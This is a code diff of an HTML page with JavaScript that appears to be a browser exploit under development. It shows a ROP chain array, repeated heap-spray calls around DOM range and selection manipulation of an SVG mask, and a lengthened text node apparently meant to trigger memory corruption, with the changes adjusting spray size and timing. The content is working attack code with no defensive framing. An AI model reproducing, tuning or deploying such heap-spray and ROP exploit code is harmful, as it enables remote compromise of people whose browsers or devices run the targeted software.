@@ -26,14 +26,15 @@ rop = [0x83000000, 0x83000001, 0x83000002, 0x83000003, 0x83000004, 0x83000005, 0
 
 window.addEventListener("load", function () {
 
-    spray4(100);  //rop len in 8 byte chunks
-    var range = document.createRange();spray4(100);
-    var selection = document.getSelection();spray4(100);
-    range.setStart(m1, 0);spray4(100);
-    range.setEnd(id1, id1.childNodes.length);spray4(100);
-	//spray4(300);  //rop len in 8 byte chunks
+    //spray4(0xa00);  //rop len in 8 byte chunks
+    var range = document.createRange();
+    var selection = document.getSelection();
+    range.setStart(m1, 0);
+    range.setEnd(id1, id1.childNodes.length);
+	spray4(300);  //rop len in 8 byte chunks
 	alert("a");
-    selection.addRange(range);spray4(100);
+    selection.addRange(range);
+	
     
 }, false);
 
@@ -44,7 +45,7 @@ window.addEventListener("load", function () {
   <mask id="m1" x="0" y="0" width="200" height="200">
    <circle cx="100" cy="100" r="20" fill="#888888"/>
    <text y="100" fill="#888888" font-size="50">
-   Text
+   Textttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt
    </text>
   </mask>
  </defs>
